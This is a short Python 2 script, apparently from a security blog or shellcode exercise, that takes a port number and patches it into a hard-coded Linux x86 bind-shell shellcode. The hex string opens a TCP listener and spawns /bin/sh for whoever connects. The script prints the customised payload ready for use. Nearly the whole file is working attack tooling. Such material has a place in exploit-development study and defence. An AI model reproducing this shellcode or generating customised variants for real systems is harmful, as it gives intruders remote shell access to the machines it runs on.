#!/usr/bin/python

# Filename: wrapper.py
# Author: David Alvarez Robles (km0xu95)
# Website: https://blog.asturhackers.es

# Purpose: This script was developed in order to dynamically change the port
# used in the Shell Bind TCP shellcode

import sys

if(len(sys.argv) != 2):
	print "Usage: ./wrapper.py <Port>"
	sys.exit(0)

elif(int(sys.argv[1])<1 or int(sys.argv[1])>65535):
	print "[-] Port number must be 1-65535"
	sys.exit(0)

else:
	base_shellcode = "\\x31\\xc0\\x89\\xc3\\x50\\x6a\\x01\\x6a\\x02\\xb0\\x66\\x43\\x89\\xe1\\xcd\\x80\\x89\\xc2\\x31\\xf6\\x56\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe6\\x6a\\x16\\x56\\x52\\xb0\\x66\\x43\\x89\\xe1\\xcd\\x80\\x6a\\x01\\x52\\xb0\\x66\\x83\\xc3\\x02\\x89\\xe1\\xcd\\x80\\x31\\xff\\x57\\x57\\x52\\xb0\\x66\\x83\\xc3\\x01\\x89\\xe1\\xcd\\x80\\x89\\xc2\\x89\\xd3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80"
	print "[*] Port number: " + str(int(sys.argv[1]))
	print "[*] Hex port number: " + format(int(sys.argv[1]), '#06x')
	new_port = format(int(sys.argv[1]), '#06x').split("0x")
	new_port_bytes = "\\x"+str(new_port[1][0:2])+"\\x"+str(new_port[1][2:4])
	print "[+] New bytes: " + new_port_bytes
	shellcode = base_shellcode.replace("\\x11\\x5c",new_port_bytes)
	print "[+] New shellcode: \"" + shellcode + "\""
